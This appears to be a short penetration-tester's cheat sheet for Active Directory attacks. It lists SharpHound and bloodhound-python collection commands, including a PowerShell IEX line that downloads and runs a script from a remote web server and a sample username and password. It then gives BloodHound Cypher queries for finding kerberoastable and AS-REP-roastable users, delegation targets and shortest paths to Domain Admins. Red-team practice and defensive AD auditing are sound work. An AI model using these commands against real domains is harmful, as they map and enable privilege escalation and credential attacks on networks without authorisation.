```
execute-assembly C:\tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -D imsonia.io 
IEX(System.Net.WebClient.DownloadString('http://webserver:4444/SharpHound.ps1'));Invoke-CollectionMethod All
bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all
```

### Kerberoasting
```
MATCH (u:User {hasspn:true}) RETURN u
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.name CONTAINS 'DOMAIN ADMINS' MATCH p = shortestPath( (u)-[*1..]->(g) ) RETURN p


```


### ASREPRoasting
```
MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

### Unconstrained Delegation
```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p

```
### Constrained Delegation
```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
MATCH (u:User {owned:true}), (c:Computer {name: "WEB-2.CYBERBOTIC.IO"}), p=shortestPath((u)-[*1..]->(c)) RETURN p
```
### Show all high value target group             
```
MATCH p=(n:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN p

```
### Find if unprivileged users have rights to add members into groups:        
```
MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p

```
